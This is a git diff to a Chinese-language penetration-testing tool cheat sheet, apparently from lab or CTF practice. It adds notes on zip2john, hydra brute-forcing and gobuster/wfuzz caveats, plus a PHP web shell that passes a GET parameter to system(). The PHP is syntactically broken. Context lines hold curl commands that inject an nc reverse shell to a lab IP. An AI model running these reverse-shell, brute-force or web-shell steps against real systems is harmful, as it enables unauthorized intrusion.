@@ -45,6 +45,12 @@ sudo nmap -sS -Pn -p- 192.168.6.166
 libreoffice2john 目标文件 > 输出文件
 ```
 
+##### zip2john,用于提取zip文档的hash
+
+```bash
+zip2john 目标文件 > 输出文件
+```
+
 ##### john用于破解密码hash,主要靠爆破，因此需要字典（john会自动识别hash类型，但是可能会失败，因此需要hash-identifier、hashid)
 
 ```bash
@@ -65,7 +71,9 @@ john -f=加密类型 -w=字典 目标文件
 
 ## gobuster
 
-向服务器发送http请求，尝试访问路径并根据相应确定路径是否存在（爆破网站目录）
+向服务器发送http请求，尝试访问路径并根据相应确定路径是否存在（确定的原理为判断是否返回状态为404）
+
+没有查到的路径不代表路径不存在，只是可能被设置无权限访问也返回了404
 
 ```bash
 #
@@ -76,6 +84,8 @@ gobuster dir -u 'http://192.168.6.166/' -w /usr/share/wordlists/dirbuster/direct
 ## wfuzz
 
 使用模糊测试的方法爆破路径，例如已知存在路径/scout/xxx/docs/，要获得xxx
+
+（同gobuster，没查到的路径不代表不存在）
 
 ```bash
 #用FUZZ作为通配符进行模糊测试,hc即hide code隐藏404响应,hl为hide length
@@ -166,6 +176,23 @@ curl -X POST -H "Content-Type: application/xml" -d '<command>nc 192.168.6.149 66
 curl "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
 ```
 
+## hydra
+
+用字典进行密码破解，支持包括ssh在内的多种协议,包括ftp、telnet、http、pop3、imap、mysql、rdp等等，只需要改变ssh字段为协议名即可
+
+```bash
+#-l指定用户名，-L指定用户名列表（用户名字典），-P指定密码列表（密码字典）
+hydra -l username -P dictionary ssh://ip(:port)
+```
+
+
+
+
+
+
+
+
+
 
 
 ```bash
@@ -181,3 +208,18 @@ curl "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/b
 ![image-20240621152125187](ToolsHub.assets/image-20240621152125187.png)
 
 ![image-20240621152106313](ToolsHub.assets/image-20240621152106313.png)
+
+
+
+```php
+<?php
+if(isset($_GET('a'))){
+    if($_GET('b') = 'pass'){
+        system($_GET('a'));
+    } else{
+        echo 'error';
+    }
+}
+?>
+```
+
